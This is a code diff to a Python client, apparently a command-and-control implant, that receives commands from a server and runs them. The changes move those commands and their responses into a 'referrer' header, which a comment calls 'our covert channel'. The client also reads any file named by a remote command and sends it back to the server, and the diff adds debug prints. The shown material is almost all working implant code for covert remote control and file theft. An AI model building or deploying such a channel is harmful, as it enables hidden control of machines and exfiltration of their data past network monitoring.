@@ -16,7 +16,7 @@ if os.name == "nt":
 else:
 	ENCODING = "utf-8"
 
-MAX_CHUNK_SIZE = 16 * 1024 # 16KB
+MAX_CHUNK_SIZE = 16 * 1024 # 16KB might need to change this 1024 bytes or 1 KB
 POPEN_TIMEOUT = 60 # seconds
 
 class Status:
@@ -24,27 +24,34 @@ class Status:
 	FAIL = "FAIL"
 
 class Request:
+	#body can be either object or dictionary
 	def __init__(self, send:str="", status:str=Status.OK, body:Union[object, dict]=dict(), header:dict=dict()):
 		self.header = {"status": status}
 
 		if status == Status.FAIL:
 			self.header["error"] = send
 
-		if isinstance(body, dict):
+		 #this is where our covert channel is
+
+		if isinstance(body, dict): #if the passed body is a diction; we are sending text
 			self.header["ct"] = "TEXT"
 
 			if status == Status.FAIL:
 				self.body = {"output": "", **body}
+				self.header["referrer"] = {"output": send, **body}
 			else:
 				self.body = {"output": send, **body}
+				self.header["referrer"] = {"output": send, **body}
 		
-		elif isinstance(body, bytes):
+		elif isinstance(body, bytes): #if the passed body is bytes then we sending bytes
 			self.header["ct"] = "BYTES"
 			self.body = body
+			self.header["referrer"] = body
 		
-		elif isinstance(body, object):
+		elif isinstance(body, object):  #if the passed body is object then we sending a file
 			self.header["ct"] = "FILE"
 			self.body = body
+			self.header["referrer"] = body
 
 		self.header = {**self.header, **header}
 
@@ -58,7 +65,7 @@ class Request:
 	def set_header(self, key:str, value:str):
 		self.header[key] = value
 	
-	def get_payload(self, encoding:str="utf-8") -> bytes:
+	def get_payload(self, encoding:str="utf-8") -> bytes: #return a bytes object of the encoded request
 		return (
 			"\r\n".join(f"{key}: {value}" for key, value in self.header.items())
 			+ "\r\n\r\n"
@@ -76,7 +83,7 @@ class Request:
 				"\r\n".join(f"{key}: {value}" for key, value in self.body.items())
 			).encode("utf-8")
 		
-		elif self.header["ct"] == "FILE":
+		elif self.header["ct"] == "FILE": 
 			while data:=self.body.read(MAX_CHUNK_SIZE):
 				yield data
 		
@@ -172,6 +179,9 @@ class Client():
 
 	def send(self, req:Request) -> None:
 		for payload in req:
+			
+			print ("PAY LAOD: ")
+			print(payload)
 			self.conn.send(payload)
 
 
@@ -186,16 +196,26 @@ class Client():
 
 	def start(self) -> None:
 		while True:
-			response = self.recv()
+			response = self.recv() #recieve the commands form the server
+			
+			print (response)
 
-			cmd = response.cmd
-			ack = response.cmd
-			params = response.params.split(" ") if response.params else response.params
+			referrerCMDS = response.header["referrer"].split(" ")# get the cmd from the referrer header
 
-			if response._direct:
+			#print(referrerCMDS)
+			cmd = referrerCMDS[0] #Get the First word aka the COmmand
+
+			ack = response.ack
+
+			#splits up the commands
+			params = referrerCMDS[1:] if referrerCMDS[1:] else None
+
+			#params = response.params.split(" ") if response.params else response.params
+
+			if response._direct:  #commands to execute
 				self.method_direct(cmd, ack, params)
 			
-			elif response._connect:
+			elif response._connect: #commands to connect
 				self.method_connect(cmd, ack, params)
 
 			else:
@@ -203,8 +223,8 @@ class Client():
 	
 
 	def method_direct(self, cmd:str, ack:str, params:str) -> None:
-		if cmd in self.direct:
-			self.direct[cmd](ack, params)
+		if cmd in self.direct: # if in command dictioanry
+			self.direct[cmd](ack, params) #execute command
 		else:
 			print("Invalid command")
 	
@@ -235,13 +255,13 @@ class Client():
 		file = params[0]
 		if os.path.exists(file):
 			with open(file, "rb") as fp:
-				self.send(Request(body=fp))
+				self.send(Request(body=fp)) #sending file as bytes
 				return
 
 		self.send(Request(f"File {file} Not found.", status=Status.FAIL))
 
 	# For upload test
-	def connect_upload(self, ack:str, params:str) -> None:
+	def connect_upload(self, ack:str, params:str) -> None: #receives from server
 		file = params[0]
 		if not os.path.exists(file):
 			with open(file, "w") as fp:
